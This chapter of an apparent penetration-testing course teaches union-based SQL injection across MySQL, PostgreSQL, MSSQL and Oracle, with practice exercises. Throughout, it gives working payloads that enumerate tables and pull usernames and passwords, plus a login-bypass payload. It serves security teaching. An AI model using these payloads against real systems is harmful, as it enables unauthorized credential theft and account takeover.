# 04 - Union-Based Injection

## Union Injection Overview

Most efficient SQL injection technique. Allows direct data extraction in one query.

### How Union Works

```sql
-- Original query
SELECT id, name, price FROM products WHERE id = 1

-- Injected UNION
SELECT id, name, price FROM products WHERE id = -1
UNION
SELECT 1, username, password FROM users--
         ↑    ↑        ↑
         │    │        └─ data we want
         │    └─ Column 2 (name position)
         └─ Column 1 (id position)
```

## Step 1: Determine Column Count

### ORDER BY Method

```sql
ORDER BY 1--    (works)
ORDER BY 2--    (works)
ORDER BY 3--    (works)
ORDER BY 4--    (ERROR → 3 columns total)
```

### UNION SELECT Method

```sql
UNION SELECT 1--           (ERROR)
UNION SELECT 1,2--         (ERROR)
UNION SELECT 1,2,3--       (SUCCESS → 3 columns)
```

**Note**: Use `NULL` to avoid type mismatch errors:

```sql
UNION SELECT NULL,NULL,NULL--
```

## Step 2: Identify Data Types

### String Position Identification

```sql
-- Test each column for string compatibility
UNION SELECT 'test',NULL,NULL--
UNION SELECT NULL,'test',NULL--  ← Works! Column 2 is string
UNION SELECT NULL,NULL,'test'--
```

### Numeric Position Identification

```sql
UNION SELECT 1,NULL,NULL--
UNION SELECT NULL,1,NULL--      ← Works! Column 2 accepts numbers
UNION SELECT NULL,NULL,1--
```

## Step 3: Data Extraction

### Single Row Extraction

```sql
-- Get database version
UNION SELECT 1,@@version,3--

-- Get current database
UNION SELECT 1,database(),3--

-- Get current user
UNION SELECT 1,user(),3--
```

### Multiple Rows (LIMIT)

```sql
-- First user
UNION SELECT 1,username,password FROM users LIMIT 0,1--

-- Second user
UNION SELECT 1,username,password FROM users LIMIT 1,1--

-- Third user
UNION SELECT 1,username,password FROM users LIMIT 2,1--
```

### Concatenation for Single Column

```sql
-- MySQL: CONCAT()
UNION SELECT 1,CONCAT(username,':',password),3 FROM users--

-- MySQL: CONCAT_WS()
UNION SELECT 1,CONCAT_WS(':',username,password,email),3 FROM users--

-- PostgreSQL: || operator
UNION SELECT 1,username||':'||password,3 FROM users--

-- MSSQL: + operator
UNION SELECT 1,username+':'+password,3 FROM users--

-- Oracle: || operator
UNION SELECT 1,username||':'||password,3 FROM users--
```

## Database-Specific Union Syntax

### MySQL

```sql
-- Basic union
' UNION SELECT 1,2,3--

-- With column names
' UNION SELECT column1,column2,column3 FROM table--

-- Group concat for multiple rows
' UNION SELECT 1,group_concat(username),group_concat(password) FROM users--
```

### PostgreSQL

```sql
-- Basic union
' UNION SELECT 1,2,3--

-- String concatenation
' UNION SELECT 1,username||':'||password,3 FROM users--

-- NULL handling (NULL FIRST/LAST)
' UNION SELECT 1,username,password FROM users ORDER BY 1 NULLS FIRST--
```

### MSSQL

```sql
-- Basic union
' UNION SELECT 1,2,3--

-- Concatenation
' UNION SELECT 1,username+CHAR(58)+password,3 FROM users--

-- Top for limit
' UNION SELECT TOP 1 username,password,3 FROM users--
```

### Oracle

```sql
-- Basic union (MUST have FROM dual if not from real table)
' UNION SELECT 1,2,3 FROM dual--

-- Real table extraction
' UNION SELECT 1,username,password FROM users--

-- ROWNUM for limit
' UNION SELECT 1,username,password FROM users WHERE ROWNUM=1--
```

## Advanced Union Techniques

### Multiple Column Concatenation

```sql
-- Extract 5 fields into 1 column
UNION SELECT 1,
  CONCAT(
    'ID:',id,
    '|User:',username,
    '|Pass:',password,
    '|Email:',email,
    '|admin:',is_admin
  ),
  3
FROM users--
```

### Conditional Extraction

```sql
-- Only admin users
UNION SELECT 1,username,password FROM users WHERE is_admin=1--

-- Specific user
UNION SELECT 1,username,password FROM users WHERE username='admin'--
```

### Cross-Database Extraction

```sql
-- MySQL: Access other databases
UNION SELECT 1,username,password FROM mysql.user--
UNION SELECT 1,table_name,3 FROM information_schema.tables
  WHERE table_schema='other_database'--
```

## Union Injection Examples by Scenario

### Scenario 1: Login Bypass

```
Target: POST /login
Fields: username, password

Payload:
username: admin' UNION SELECT 'admin','hashed_password'--
password: anything

Result: Login as admin without knowing password
```

### Scenario 2: Product Page Extraction

**Target:** `/product?id=1` with 3 columns (id, name, description)

```mermaid
flowchart LR
    A[Step 1: UNION SELECT 1,2,3--] --> B{Numbers appear?}
    B -->|Yes| C[Identify column positions]
    B -->|No| D[Adjust column count]
    C --> E[Step 2: UNION SELECT 1,database(),version()--]
    E --> F[Database info displayed]
    F --> G[Step 3: Extract table names]
    G --> H[UNION SELECT 1,table_name,3 FROM information_schema.tables]
    H --> I[List all tables]
```

**Step Details:**

| Step | Payload                                                                                      | Result                          |
| ---- | -------------------------------------------------------------------------------------------- | ------------------------------- |
| 1    | `UNION SELECT 1,2,3--`                                                                       | Shows numbers in page           |
| 2    | `UNION SELECT 1,database(),version()--`                                                      | Database info in visible column |
| 3    | `UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--` | Lists all tables                |

### Scenario 3: Search Function

```
Target: /search?q=laptop
Returns: JSON with field "title", "price", "description"

Payload:
?q=laptop' UNION SELECT username,password,email FROM users--

Result: JSON containing user credentials in response
```

## Troubleshooting Union Injection

### Problem: "The used SELECT statements have a different number of columns"

**Solution**: Column count wrong. Repeat ORDER BY or UNION SELECT with different count.

### Problem: "Conversion failed" or "Type mismatch"

**Solution**: Use NULL for test, then replace with data.

```sql
-- Wrong
UNION SELECT 'string',123,'string'--

-- Right (if column 2 expects string)
UNION SELECT 'string','123','string'--
```

### Problem: Union results not showing

**Possible causes**:

- Original query returns row (id must be invalid like -1)
- Application only shows first result set
- Data types incompatible

**Solution**:

```sql
-- Use invalid ID so original query returns empty
?id=-1' UNION SELECT 1,2,3--

-- Or use LIMIT/OFFSET
?id=1' UNION SELECT 1,2,3 LIMIT 1,1--
```

## Practice Exercises

### Exercise 1: Column Count

Target: `http://target.com/item?id=1`

Use ORDER BY to determine how many columns.

### Exercise 2: Data Type Mapping

target: Same as above, 4 columns.

Identify which columns accept string data.

### Exercise 3: Full Extraction

Extract:

1. Database version
2. All table names
3. Columns from table "users"
4. Username and password from admin

## Quick Reference

| Database   | Column Count                    | Concatenation               | Limit                 |
| ---------- | ------------------------------- | --------------------------- | --------------------- |
| MySQL      | `ORDER BY` / `UNION SELECT 1,2` | `CONCAT()` or `CONCAT_WS()` | `LIMIT x,1`           |
| PostgreSQL | Same                            | `\|\|` or `CONCAT()`        | `LIMIT 1 OFFSET x`    |
| MSSQL      | Same                            | `+` or `CONCAT()`           | `TOP x`               |
| Oracle     | Same                            | `\|\|`                      | `ROWNUM=x` or `FETCH` |

## Next Step

Continue to [05 - Database Fingerprinting](05-Database-Fingerprinting.md) to identify target characteristics.
